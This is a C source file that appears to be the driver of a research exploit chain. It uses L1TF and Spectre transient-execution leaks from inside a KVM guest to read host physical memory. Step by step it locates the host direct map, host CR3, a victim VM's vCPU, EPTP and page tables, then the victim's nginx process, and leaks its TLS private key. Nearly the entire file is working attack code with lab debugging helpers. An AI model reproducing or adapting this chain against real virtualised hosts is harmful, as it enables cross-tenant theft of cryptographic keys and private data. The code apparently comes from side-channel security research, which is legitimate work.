#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include "config.h"
#include "leak.h"
#include <fcntl.h>

#define direct_map 0xffff934040000000

int in_direct_map(va_t va, va_t dm)
{
	return (va >> 40) == (dm >> 40);
}

int in_vmalloc(va_t va, va_t dm)
{
	va_t vmalloc = dm + (0x1ULL << 40);
	return vmalloc < va && va < vmalloc+(0x20ULL << 40);
}

void config_print(void)
{
	printf("========[CONFIG]========\n");
	printf("MACHINE: %11s (%d)\n", MACHINE_STR, MACHINE);
	printf("HELPERS: %11s (%d)\n", HELPERS ? "YES" : "NO", HELPERS);
	printf("LEAK:    %11s (%d)\n", LEAK_STR, LEAK);
	printf("========================\n\n");
}

hva_t my_lapic = 0;

hva_t host_direct_map(hpa_t base)
{
	printf("\nhost_direct_map(base=%lx)\n" HLINE, base);
#if LEAK == SKIP && defined(HOST_DIRECT_MAP)
	dump(HOST_DIRECT_MAP);
	return HOST_DIRECT_MAP;
#endif
	const int verbose = 2;

	hva_t lapic[2];
retry_lapic:
	for (int r = 0; r < 5; r++)
		leak(lapic, base, base, sizeof(lapic));
	if (verbose) dump(lapic[0]);
	if (verbose) dump(lapic[1]);
	for (int i = 0; i < 2; i++)
		if ((lapic[i] & 0xffff0000000000ff) != 0xffff000000000000)
			goto retry_lapic;

	hpa_t lapic_pa = 0;
	while (!lapic_pa) {
		for_each_around(gb, (long)(base >> 30), 32, 1) {
			hpa_t pa = (gb << 30) | (lapic[0] & ((1ULL << 30) - 1));
			uint16_t magic;
			leak(&magic, base, pa+2, 2);
			if (verbose >= 2)printf("gb = %3lx, pa = %10lx: %16hx\n", gb, pa, magic);
			if (magic == 0xfee0) {
				lapic_pa = pa;
				break;
			}
		}
	}
	if (verbose) dump(lapic_pa);

	hva_t hdm = lapic[0] - lapic_pa;
	dump(hdm);

	uint16_t magic;
	leak(&magic, base, lapic[1]-hdm+2, 2);
	if (magic != 0xfee0) {
		dump((u64)magic);
		goto retry_lapic;
	}

	my_lapic = lapic[0];

	return hdm;
}

hva_t own_vcpu(hpa_t base, hva_t hdm)
{
	printf("\nown_vcpu(base=%lx, hdm=%lx)\n" HLINE, base, hdm);
#if LEAK == SKIP && defined(OWN_VCPU)
	dump(OWN_VCPU);
	return OWN_VCPU;
#endif

	// TODO: why does the leak below incorrectly leak apic ending in 0x70 (not 0x00)?
	// lapic = leak64(base, base);
	if (!my_lapic) {
retry_lapic:
		my_lapic = leak64(base, base);
		if (!in_direct_map(my_lapic, hdm)) {
			dump(my_lapic);
			goto retry_lapic;
		}
	}
	dump(my_lapic);

	hva_t vcpu;
retry:
	vcpu = leak64(base, my_lapic-hdm+H_LAPIC_VCPU);
	dump(vcpu);
	if (!in_direct_map(vcpu, hdm))
		goto retry;

	hva_t kvm = 0;
	leak(((char *)&kvm)+4, base, vcpu-hdm+H_VCPU_KVM+4, 4);
	dump(kvm);
	if (!in_vmalloc(kvm, hdm))
		goto retry;

#if HELPERS && defined(OWN_VCPU)
	printf("[%s] own_vcpu: %lx, ground truth: %lx\n", vcpu == OWN_VCPU ? "OK" : "ERROR", vcpu, OWN_VCPU);
	if (!(vcpu == OWN_VCPU)) exit(1);
#endif

	return vcpu;
}

hpa_t host_cr3(hpa_t base, hva_t hdm, hva_t vcpu)
{
	printf("\nhost_cr3(base=%lx, hdm=%lx, vcpu=%lx)\n" HLINE, base, hdm, vcpu);
#if LEAK == SKIP && defined(HCR3)
	dump(HCR3);
	return HCR3;
#endif

	hva_t pid;
retry_task:
	pid= leak64(base, vcpu-hdm+H_VCPU_PID);
	dump(pid);
	if (!in_direct_map(pid, hdm))
		goto retry_task;

	hva_t task = leak64(base, pid-hdm+H_PID_TASKS) - H_TASK_PID_LINKS;
	dump(task);
	if (!in_direct_map(task, hdm))
		goto retry_task;

	char comm;
	leak(&comm, base, task-hdm+H_TASK_COMM, 1);
	if (comm != OWN_TASK_NAME[0]) {
		dump((u64)comm);
		goto retry_task;
	}

#if HELPERS && defined(OWN_TASK)
	printf("[%s] task: %lx, ground truth: %lx\n", task == OWN_TASK ? "OK" : "ERROR", task, OWN_TASK);
	if (!(task == OWN_TASK)) exit(1);
#endif

	hva_t mm;
retry_pgd:
	mm = leak64(base, task-hdm+H_TASK_MM);
	dump(mm);
	if (!in_direct_map(mm, hdm))
		goto retry_pgd;

	hva_t pgd = leak64(base, mm-hdm+H_MM_PGD);
	dump(pgd);
	if (!in_direct_map(pgd, hdm))
		goto retry_pgd;
	hpa_t hcr3 = pgd - hdm;
	dump(hcr3);

	char low;
	leak(&low, base, hcr3+0xff8, 1);
	if (low != 0x67)
		goto retry_pgd;

#if HELPERS && defined(HCR3)
	printf("[%s] hcr3: %lx, ground truth: %lx\n", hcr3 == HCR3 ? "OK" : "ERROR", hcr3, HCR3);
	if (!(hcr3 == HCR3)) exit(1);
#endif

	return hcr3;
}

hva_t victim_vcpu(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu_self)
{
	printf("\nvictim_vcpu(base=%lx, hdm=%lx, hcr3=%lx, vcpu_self=%lx)\n" HLINE, base, hdm, hcr3, vcpu_self);
#if LEAK == SKIP && defined(VICTIM_VCPU)
	dump(VICTIM_VCPU);
	return VICTIM_VCPU;
#endif

	u64 retries_kvm_vic = 0, retries_kvm_next = 0, retries_vcpu_vic = 0;

	hva_t kvm;
retry_kvm:
	kvm = leak64(base, vcpu_self-hdm+H_VCPU_KVM);
	dump(kvm);
	if (!in_vmalloc(kvm, hdm))
		goto retry_kvm;

	hpa_t kvm_p2 = 97; //translate(base, kvm+0x1000, hcr3);
	if (kvm_p2 == -1ULL)
		goto retry_kvm;
	
	hva_t vcpu = vcpu_self; //leak64(base, kvm_p2-0x1000+H_KVM_VCPU_ARRAY);
	dump(vcpu);
	if (vcpu != vcpu_self)
		goto retry_kvm;

	// while (1) {
	// 	u64 data = 0;
	// 	for (int off = H_KVM_VCPU_ARRAY; off < 0x2000; off += 8) {
	// 		data = 0;
	// 		leak(&data, base, kvm_p2-0x1000+off+7, 1);
	// 		if (!data)
	// 			continue;
	// 		leak(&data, base, kvm_p2-0x1000+off, 8);
	// 		printf("@kvm+%4x: %lx\n", off, data);
	// 	}
	// }
	while (1) {
		u64 data = 0;
		for (int poff = 0x1000; poff < 0x2000; poff += 0x1000) {
			hpa_t kvm_page = translate(base, kvm+poff, hcr3);
			for (int rr = 0; rr < 10; rr++)
				kvm_page = translate(base, kvm+poff, hcr3);
			dump(kvm_page);
			for (int off = 0x0; off < 0x1000; off += 8) {
				// data = 0;
				// leak(&data, base, kvm_p2-0x1000+off+7, 1);
				// if (!data)
				// 	continue;
				leak(&data, base, kvm_page+off, 8);
				printf("@kvm+%8x+%4x: %16lx %s\n", poff, off, data, data != 0 ? "<--- DATA" : "");
			}
		}
	}
	exit(1);

	hva_t kvm_vic;
retry_kvm_vic:
	if (retries_kvm_vic++ >= 2) {
		retries_kvm_vic = 0;
		goto retry_kvm;
	}
	kvm_vic = leak64(base, kvm_p2-0x1000+H_KVM_VM_LIST) - H_KVM_VM_LIST;
	dump(kvm_vic);
	if (!in_vmalloc(kvm_vic, hdm))
		goto retry_kvm_vic;

	hpa_t kvm_vic_p2 = translate(base, kvm_vic+0x1000, hcr3);
	if (kvm_p2 == -1ULL)
		goto retry_kvm_vic;

	hva_t kvm_next;
retry_kvm_next:
	if (retries_kvm_next++ >= 3) {
		retries_kvm_next = 0;
		goto retry_kvm_vic;
	}
	kvm_next = leak64(base, kvm_vic_p2-0x1000+H_KVM_VM_LIST) - H_KVM_VM_LIST;
	if (kvm_next != kvm) {
		dump(kvm_next);
		goto retry_kvm_next;
	}

#if HELPERS && defined(OWN_KVM) && defined(VICTIM_KVM)
	printf("[%s] kvm: %lx, ground truth: %lx\n", kvm == OWN_KVM ? "OK" : "ERROR", kvm, OWN_KVM);
	if (!(kvm == OWN_KVM)) exit(1);
	printf("[%s] kvm_vic: %lx, ground truth: %lx\n", kvm_vic == VICTIM_KVM ? "OK" : "ERROR", kvm_vic, VICTIM_KVM);
	if (!(kvm_vic == VICTIM_KVM)) exit(1);
	dump(leak_attempts);
#endif

	hva_t head;
retry_head:
	head = leak64(base, kvm_vic_p2-0x1000+H_KVM_VCPU_ARRAY+H_XARRAY_HEAD);
	dump(head);
	if (!in_direct_map(head, hdm))
		goto retry_head;

	u64 entry = leak64(base, head-hdm+0x18);
	hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
	dump(ptr);
	if (!in_direct_map(ptr, hdm))
		goto retry_head;

	hva_t vcpu_vic;
retry_vcpu_vic:
	if (retries_vcpu_vic++ >= 2) {
		retries_vcpu_vic = 0;
		goto retry_head;
	}
	vcpu_vic = leak64(base, ptr-hdm+0x10);
	dump(vcpu_vic);
	if (!in_direct_map(vcpu_vic, hdm))
		goto retry_vcpu_vic;

	hva_t kvm_leak = leak64(base, vcpu_vic-hdm);
	dump(kvm_leak);
	if (kvm_leak != kvm_vic)
		goto retry_vcpu_vic;

#if HELPERS && defined(VICTIM_VCPU)
	printf("[%s] vcpu_vic: %lx, ground truth: %lx\n", vcpu_vic == VICTIM_VCPU ? "OK" : "ERROR", vcpu_vic, VICTIM_VCPU);
	dump(leak_attempts);
	if (!(vcpu_vic == VICTIM_VCPU)) exit(1);
#endif

	return vcpu_vic;
}

hpa_t guest_eptp(hpa_t base, hva_t hdm, hva_t vcpu)
{
	printf("\nguest_eptp(base=%lx, hdm=%lx, vcpu=%lx)\n" HLINE, base, hdm, vcpu);
#if LEAK == SKIP && defined(EPTP)
	dump(EPTP);
	return EPTP;
#endif

	hva_t eptp;
retry_eptp:
	eptp = leak_pte(base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_ROOT_MMU+H_MMU_ROOT+H_INFO_HPA);
	dump(eptp);
	if (eptp & 0xfff)
		goto retry_eptp;

	pte_t entry = leak_pte(base, eptp);
	if ((entry & 0xfff) != 0x907) {
		dump(entry);
		goto retry_eptp;
	}

#if HELPERS && defined(EPTP)
	printf("[%s] eptp: %lx, ground truth: %lx\n", eptp == EPTP ? "OK" : "ERROR", eptp, EPTP);
	if (!(eptp == EPTP)) exit(1);
#endif

	return eptp;
}

hpa_t guest_cr3(hpa_t base, hva_t hdm, hva_t vcpu, hpa_t eptp)
{
	printf("\nguest_cr3(base=%lx, hdm=%lx, vcpu=%lx, eptp=%lx)\n" HLINE, base, hdm, vcpu, eptp);
#if LEAK == SKIP && defined(GCR3)
	dump(GCR3);
	return GCR3;
#endif

	gpa_t ggcr3 = 0;
retry_ggcr3:
	l1tf_purge_cache(vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3+1, 4);
	leak(((char *)&ggcr3)+1, base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3+1, 4);
#if HELPERS
	const int verbose = 1;
	if (verbose) {
		u64 truee = hc_read_pa(vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3) & 0xffffffff00;
		printf("leak ggcr3: leaked: %lx, truee = %lx (%s)\n", ggcr3, truee, truee != ggcr3 ? "ERROR" : "OK");
		if ((truee ^ ggcr3) & ggcr3) {
			printf("\nUNRECONCILABLE ERROR!\n");
			dump(truee ^ ggcr3);
			dump((truee ^ ggcr3) & ggcr3);
			printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n\n");
			printf("\n\n\n\n\n\n\n\n\n\n\n");
			exit(1);
		}
	}
#endif

	dump(ggcr3);
	hpa_t gcr3 = translate(base, ggcr3, eptp);
	dump(gcr3);
	if (gcr3 == -1ULL)
		goto retry_ggcr3;

	char low;
	leak(&low, base, gcr3+0xff8, 1);
	if (low != 0x67) {
		dump((u64)low);
		dump(leak64(base, gcr3+0xff8));
		goto retry_ggcr3;
	}

	return gcr3;
}

gva_t guest_text(hpa_t base, hpa_t eptp, hpa_t gcr3)
{
	printf("\nguest_text(base=%lx, eptp=%lx, gcr3=%lx)\n" HLINE, base, eptp, gcr3);
#if LEAK == SKIP && defined(GTEXT)
	dump(GTEXT);
	return GTEXT;
#endif

	gpa_t gpgd;
retry_gpgd:
	gpgd = leak_pte(base, gcr3 + 0x1ff*sizeof(pte_t));
	dump(gpgd);
	if ((gpgd & 0xfff) != 0x067) {
		goto retry_gpgd;
	}

	hpa_t l1 = translate(base, gpgd & PFN_MASK, eptp);
	gpa_t gpud = leak64(base, l1 + 0x1fe*sizeof(pte_t));
	dump(gpud);
	if ((gpud & 0xfff) != 0x063) {
		goto retry_gpgd;
	}

	hpa_t l2 = translate(base, gpud & PFN_MASK, eptp);
	uint8_t gpmd_low;
	long i;
	printf("searching for guest kernel text as first non-zero pmd...\n");
	for (i = 0; i < 0x200; i += 0x10) {
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
		if (gpmd_low & 1)
			break;
	}
	while ((gpmd_low & 1) && i >= 0) {
		i--;
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
	}
	i++;

	pte_t entries[2];
	leak(entries, base, l2+(i-1)*sizeof(pte_t), sizeof(entries));
	dump(entries[0]);
	dump(entries[1]);
	if (!(entries[0] == 0 && (entries[1] & ~PFN_MASK) == 0xa1)) {
		goto retry_gpgd;
	}

	gva_t gtext = (0xffffULL << 48) | (0x1ffULL << 39) | (0x1feULL << 30) | (i << 21);
	dump(gtext);

#if HELPERS && defined(GTEXT)
	printf("[%s] gtext: %lx, ground truth: %lx\n", gtext == GTEXT ? "OK" : "ERROR", gtext, GTEXT);
	if (!(gtext == GTEXT)) exit(1);
#endif

	return gtext;
}

/* Iterate one step over doubly linked list.
 * `eptp == 0` --> `*entry_v` is host virtual address, `cr3` is host CR3.
 * `eptp != 0` --> `*entry_v` is guest virtual address, `cr3` is guest CR3.
 * `*entry_p` is always the *host* physical address of `*entry_v`.
 * `reverse` determines whether to walk the list forward or backward.
 */
void list_next(hpa_t base, hpa_t eptp, hpa_t cr3, va_t *entry_v, hpa_t *entry_p, int reverse)
{
	const int verbose = 0;
	int off_to = reverse ? 8 : 0;
	int off_fr = reverse ? 0 : 8;
	va_t to_v, from_v;
	hpa_t to_p;
	int count = 0;
	if (verbose >= 2) dump(*entry_v);
	if (verbose >= 2) dump(*entry_p);
	assert((*entry_v >> 12) == ((*entry_v + 15) >> 12) || "list entry across pages not implemented yet...");

	do {
		to_v = leak64(base, (*entry_p)+off_to);
		if (verbose >= 2) dump(to_v);

		if (eptp)
			to_p = translate_tdp(base, to_v, cr3, eptp);
		else
			to_p = translate(base, to_v, cr3);
		if (verbose >= 2) dump(to_p);

		from_v = leak64(base, to_p+off_fr);
		if (verbose >= 2) dump(from_v);

		if (++count % 10 == 0) {
			printf("WARNING: list_next count %d\n", count);
			dump(*entry_v); dump(*entry_p); dump(to_v); dump(to_p); dump(from_v);
			if (count == 50)
				exit(1);
		}
		dump((u64)hamming_dist(from_v, *entry_v));
	} while (hamming_dist(from_v, *entry_v) > 12); // allow 3 wrong nibbles

	*entry_v = to_v;
	if (verbose >= 2) dump(*entry_v);
	*entry_p = to_p;
	if (verbose >= 2) dump(*entry_p);
}

/* For loop over all entries of the list, except `list_v` itself.
 */
#define list_walk_except(base, eptp, cr3, list_v, entry_v, entry_p, reverse) \
	for (list_next(base, eptp, cr3, &(entry_v), &(entry_p), reverse); \
		(entry_v) != (list_v); \
		list_next(base, eptp, cr3, &(entry_v), &(entry_p), reverse))

void leak_task(hpa_t base, hpa_t eptp, hpa_t cr3, va_t task, char *comm, pid_t pids[2], int len)
{
	const int verbose = 3;

retry:
	if (verbose >= 2) len = len > TASK_COMM_LEN ? len : TASK_COMM_LEN;
	hpa_t comm_pa = eptp ? translate_tdp(base, task+G_TASK_COMM, cr3, eptp) : translate(base, task+H_TASK_COMM, cr3);
	if (verbose >= 3) dump(comm_pa);
	leak(comm, base, comm_pa, len);

	if (verbose >= 2) {
		hpa_t pids_pa = eptp ? (comm_pa - G_TASK_COMM + G_TASK_PID) : (comm_pa - H_TASK_COMM + H_TASK_PID);
		if ((pids_pa >> 12) != (comm_pa >> 12))
			pids_pa = eptp ? translate_tdp(base, task+G_TASK_PID, cr3, eptp) : translate(base, task+H_TASK_PID, cr3);
		if (verbose >= 3) dump(pids_pa);
		leak(pids, base, pids_pa, 2*sizeof(pid_t));
	}

	if (verbose) {
		printf("task %16lx: pid = %5d, tgid = %5d, comm = \"%s\", (i.e., '", task, pids[0], pids[1], comm);
		printf("%7s = %s [", "comm", comm);
		for (int i = 0; i < len; i++)
			printf("%c", isprint(comm[i]) ? comm[i] : '.');
		printf("')\n");
	}

	int nr_checks = len < 3 ? len : 3;
	for (int i = 0; i < nr_checks; i++)
		if (!isprint(comm[i]))
			goto retry;
}

hpa_t guest_find_task(hpa_t base, hpa_t eptp, hpa_t gcr3, gva_t gtext, const char *name)
{
	printf("\nguest_find_task(base=%lx, eptp=%lx, gcr3=%lx, gtext=%lx, name=%s)\n" HLINE, base, eptp, gcr3, gtext, name);
#if LEAK == SKIP && defined(NGINX)
	dump(NGINX);
	return NGINX;
#endif
	const int reverse = 1;
	int len = strlen(G_INIT_NAME);
	char comm[TASK_COMM_LEN+1] = {0};
	pid_t pids[2] = {0};
	gva_t task = 0;

	gva_t ginit = gtext + G_TEXT_INIT_TASK;
	dump(ginit);
	leak_task(base, eptp, gcr3, ginit, comm, pids, len);
	if (nr_letters_equal(comm, G_INIT_NAME) < len/2)
		printf("\nWARNING! unexpected init's comm (expected: \"%s\", leaked: \"%s\")\n\n", G_INIT_NAME, comm);

	len = strlen(name) < TASK_COMM_LEN ? strlen(name) : TASK_COMM_LEN;
	gva_t tasks_v = ginit + G_TASK_TASKS;
	hpa_t tasks_p;
retry_tasks_p:
	tasks_p = translate_tdp(base, tasks_v, gcr3, eptp);
	if (tasks_p == -1UL)
		goto retry_tasks_p;

	list_walk_except(base, eptp, gcr3, ginit+G_TASK_TASKS, tasks_v, tasks_p, reverse) {
		task = tasks_v - G_TASK_TASKS;
		leak_task(base, eptp, gcr3, task, comm, pids, len);
		if (nr_letters_equal(comm, name) >= 2*len/3)
			break;
	}

	if (reverse && strcmp(name, "nginx") == 0) {
		// Go two tasks further, to reach the nginx master process.
		for (int i = 0; i < 2; i++) {
			list_next(base, eptp, gcr3, &tasks_v, &tasks_p, reverse);
			task = tasks_v - G_TASK_TASKS;
			leak_task(base, eptp, gcr3, task, comm, pids, len);
		}
	}

	dump(task);

#if HELPERS && defined(NGINX)
	printf("[%s] nginx: %lx, ground truth: %lx\n", task == NGINX ? "OK" : "ERROR", task, NGINX);
	if (!(task == NGINX)) exit(1);
#endif

	return task;
}

char *nginx_leak_key(hpa_t base, hpa_t eptp, hpa_t gcr3, hpa_t nginx)
{
	printf("\nnginx_leak_key(base=%lx, eptp=%lx, gcr3=%lx, nginx=%lx)\n" HLINE, base, eptp, gcr3, nginx);
	char *key = malloc(SSLKEY_LEN);


	// Find nginx's CR3.
	gva_t gmm;
retry_gmm:
	gmm = leak64(base, nginx+G_TASK_MM);
	dump(gmm);
	hpa_t nginx_pgd = translate_tdp(base, gmm+G_MM_PGD, gcr3, eptp);
	dump(nginx_pgd);

	gva_t nginx_cr3 = leak64(base, nginx_pgd);
	dump(nginx_cr3);
	hpa_t ngcr3 = translate_tdp(base, nginx_cr3, gcr3, eptp);
	dump(ngcr3);

	char low;
	leak(&low, base, ngcr3+0xff8, 1);
	if (low != 0x67) {
		dump((u64)low);
		goto retry_gmm;
	}

	// Find nginx's heap.
	// hpa_t heap_hpa = translate_tdp(base, gmm+G_MM_HEAP, gcr3, eptp);
	hpa_t heap_hpa = nginx_pgd - G_MM_PGD + G_MM_HEAP;
retry_heap:
	dump(heap_hpa);
	assert((heap_hpa >> 12) == (nginx_pgd >> 12));
	gva_t heap = leak64(base, heap_hpa);
	dump(heap);

	// Leak the private key.
	hpa_t sslkey = translate_tdp(base, heap+NGINX_SSLKEY, ngcr3, eptp);
	dump(sslkey);
	leak(key, base, sslkey, 4);
	display(key, 4);
	if (*(uint32_t *)key != SSLKEY_MAGIC)
		goto retry_heap;

	leak(key, base, sslkey, SSLKEY_LEN);
	display(key, SSLKEY_LEN);

	return key;
}

/* TODO
 * - noisy cheats
 * - guest direct map pointers: skip 2D PTW
 * - l1tf leakage caching: better take advantage (e.g. for similar translations).abort
 */

/* Exploit Chain
 * =============
 *
 * Our goals are the following:
 * - Find host's direct map: map -> lapic; brute force lapic's pa.
 * - Leak host's CR3: lapic -> vcpu -> pid -> task -> mm.
 * - Find victim VCPU: vcpu -> kvm -{vm_list}-> kvm -> vcpu_array -> vcpu.
 * - Leak guest's EPTP: vcpu -> arch -> mmu -> info.
 * - Leak guest's CR3: vcpu -> arch -> cr3.
 * - Find guest's kernel text: read from page tables.
 * - Find nginx: text -> init -{tasks,comm}-> nginx.
 * - Leak TSL key: nginx -> mm -> pgd; mm -> heap.
 */
void exploit_chain(hpa_t base)
{
#define pr_la printf("leak_attempts: %lu, l1tf_cached: %lu, net-attempts: %lu\n", leak_attempts, l1tf_cached,  leak_attempts-l1tf_cached)
#define tt do { printf("took %.1f seconds\n", (clock_read()-t)/1000000000.0); t = clock_read(); } while (0)
	u64 t0 = clock_read();
	u64 t = t0;
	pr_la; hva_t hdm = host_direct_map(base);
	tt; pr_la; hva_t vcpu_self = own_vcpu(base, hdm);
	tt; pr_la; hpa_t hcr3 = host_cr3(base, hdm, vcpu_self);
	tt; pr_la; hva_t vcpu_vic = victim_vcpu(base, hdm, hcr3, vcpu_self);
	tt; pr_la; hpa_t eptp = guest_eptp(base, hdm, vcpu_vic);
	tt; pr_la; hpa_t gcr3 = guest_cr3(base, hdm, vcpu_vic, eptp);
	tt; pr_la; gva_t gtext = guest_text(base, eptp, gcr3);
	tt; pr_la; hpa_t nginx = guest_find_task(base, eptp, gcr3, gtext, "nginx");
	tt; pr_la; char *key = nginx_leak_key(base, eptp, gcr3, nginx);
	printf("key not unused: %p\n", key);
	tt; pr_la;

	printf("Total exploit chain took %.1f seconds\n", (clock_read()-t0)/1000000000.0);

	// dump(procfs_get_data(0xffffffff9f000000));

	// hpa_t text = translate_tdp(base, 0xffffffff9f000000, gcr3, eptp);
	// dump(leak64(base, text));

	// dump_page_table_mappings(base, gcr3, eptp);

	// dump(leak64(base, vcpu_vic-hdm+H_VCPU_ARCH+15*8));
}

void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len);

void experiment_very_slow_leaking_addrs(hpa_t base)
{
	hpa_t pa = 0x102372030;
	// hpa_t pa = 0x279a42ff8;
	// hpa_t pa = 0x10236f490;
	u64 val = hc_read_pa(pa);
	dump(val);
	u64 leaked;
	while (1) {
		for (spectre_evict_amount = 0; spectre_evict_amount <= 1024;
			spectre_evict_amount = (spectre_evict_amount == 0 ? 1 : 2*spectre_evict_amount)) {
			for (int it = 0; it < 2; it++) {
				printf("evamount =%5d  it =%5d", spectre_evict_amount, it); fflush(stdout); printf(CLEAR_LINE);
			_l1tf_leak((char *)&leaked, base, pa, 8);
			if (leaked)
				printf("evamount =%5d  it =%5d  val = %16lx  leaked = %16lx\n", spectre_evict_amount, it, val, leaked);
			}
		}
	}
}

void find_victim_page(hpa_t base)
{
	void *vp = l1tf_spawn_leak_page();
	printf("starting l1tf_find_page_pa(%p)...\n", vp);
	hpa_t pa = l1tf_find_page_pa(vp);
	printf("victim page (va %p) at pa %lx\n", vp, pa);
	l1tf_test(vp, pa, 10000);
	for (int i = 0; i < 128; i++)
		*((char *)vp + i) = (char)i;
	printf("victim page data:\n");
	display(vp, 128);
	// printf("forever touching the first two cachelines of victim page now...\n");
	// while (1) {
	// 	*(volatile char *)vp;
	// 	*((volatile char *)vp + 64);
	// }
	printf("forever idle spinning now...\n");
	while (1);
}

void refill_victim_page(hpa_t base)
{
	void *vp = l1tf_spawn_leak_page();
	for (int i = 0; i < 128/8; i++)
		*((u64 *)vp + i) = ((u64)rand() << 32) | rand();
	printf("victim page data:\n");
	display(vp, 128);
	printf("forever idle spinning now...\n");
	while (1);
}

hpa_t find_other_victim_page(hpa_t base)
{
	const int verbose = 1;
	printf("find_other_victim_page(%lx)\n", base);

	  uint64_t t_start = clock_read();
	  u64 themagic = 0x6b8b4567327b23c6;
	  hpa_t pa = -1;

	  for (int run = 0; run < 100; run++) {
	      int off;
	      for (off = 0; off < 8; off += 2) {
		uint16_t magic = *(uint16_t *)((char *)&themagic + off);
		int iters = 1000 + off*100000;
		pa = l1tf_find_magic16(base, magic, 0, HOST_MEMORY_SIZE, 0x1000, iters);
		if (pa == -1UL)
		  break;
		if (verbose >= 1) printf("l1tf_find_page_pa: run %3d  pa %12lx\n", run, pa);
	      }
	      if (off == 8) {
		if (verbose >= 1) {
		  double time = (clock_read()-t_start)/1000000000.0;
		  printf("l1tf_find_page_pa: found pa %lx in %.1f sec\n", pa, time);
		}
		dump(pa);
		return pa;
	      }
	  }
	  dump(pa);
	  return pa;
}

void reverse_kvm_module(hpa_t base)
{
	hpa_t vcpu = -1; //OWN_VCPU - HOST_DIRECT_MAP;
	dump(vcpu);

	while (1) {
		char data[0x10];
		for (int i = 0; i < 100; i++) {
			l1tf_leak(data, base, vcpu+0x10, sizeof(data));
			display(data, sizeof(data));
		}
	}
	//   0:  ffff936a91dba828   28 a8 db 91 6a 93 ff ff (...j...
	//   8:  ffffffff8555d368   68 d3 55 85 ff ff ff ff h.U.....

	//    0:  ffffab3801795000   00 50 79 01 38 ab ff ff .Py.8...
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:  ffff93f671ad5280   80 52 ad 71 f6 93 ff ff .R.q....
	//   18:  ffffffff89e122f0   f0 22 e1 89 ff ff ff ff ."......
	//   20:                 0   00 00 00 00 00 00 00 00 ........
	//   28:                 0   00 00 00 00 00 00 00 00 ........
}

void leak_other_victim_page(hpa_t base)
{
	hpa_t pa_vic = 0x3ff3e41000;
	while (1) {
		char buf[128];
		leak(buf, base, pa_vic, sizeof(buf));
		display(buf, sizeof(buf));
	}
}

int main(void)
{
	config_print();
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	hpa_t base = gadget_base();

	exploit_chain(base);

	// get_feeling_for_kernel_kvm_data_structures();

	return 0;
}
